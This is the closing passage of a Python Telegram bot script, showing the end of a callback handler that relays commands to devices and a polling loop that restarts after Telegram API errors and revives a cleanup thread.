        send_command_to_device(chat_id, set_code, command_type, edit_message_id=message_id)
        time.sleep(1)
        show_device_info(chat_id, set_code, edit_message_id=message_id)
        return

    safe_edit_or_send(chat_id, "❌ Unknown callback data.", message_id, parse_mode='HTML')

# ============================================================
# اجرای ربات
# ============================================================
def run_bot():
    cleanup_thread = start_cleanup_thread()
    logger.info("🤖 Bot started with WebSocket connection.")
    while True:
        try:
            bot.polling(non_stop=False, timeout=60, long_polling_timeout=30)
        except ApiTelegramException as e:
            if e.result_json.get('error_code') == 409:
                logger.warning("Conflict (409) - another instance is running? Waiting and restarting...")
                time.sleep(5)
                continue
            else:
                logger.error(f"Telegram API error: {e}")
                time.sleep(5)
                continue
        except Exception as e:
            logger.error(f"⚠️ Bot polling crashed: {e}. Restarting in 5 seconds...")
            time.sleep(5)
            if not cleanup_thread.is_alive():
                logger.warning("Cleanup thread died, restarting...")
                cleanup_thread = start_cleanup_thread()
            continue

if __name__ == '__main__':
    run_bot()